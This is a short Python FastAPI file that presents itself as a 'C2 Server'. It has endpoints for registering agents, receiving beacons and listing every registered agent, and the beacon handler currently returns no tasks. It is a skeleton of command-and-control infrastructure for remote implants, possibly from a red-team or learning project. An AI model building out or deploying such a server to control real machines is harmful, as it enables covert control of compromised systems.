from fastapi import FastAPI, Request
from database import (
    init_db,
    register_agent,
    update_last_seen,
    get_all_agents
)

app = FastAPI()


# Initialize DB when server starts
@app.on_event("startup")
def startup():
    init_db()


@app.get("/")
def home():
    return {"message": "C2 Server Running"}


# Agent registration
@app.post("/register")
async def register(request: Request):
    agent_data = await request.json()
    agent_id = register_agent(agent_data)

    return {"agent_id": agent_id}


# Beacon endpoint
@app.post("/beacon/{agent_id}")
async def beacon(agent_id: str):
    update_last_seen(agent_id)

    return {"task": "none"}


# Debug endpoint
@app.get("/agents")
def agents():
    return get_all_agents()
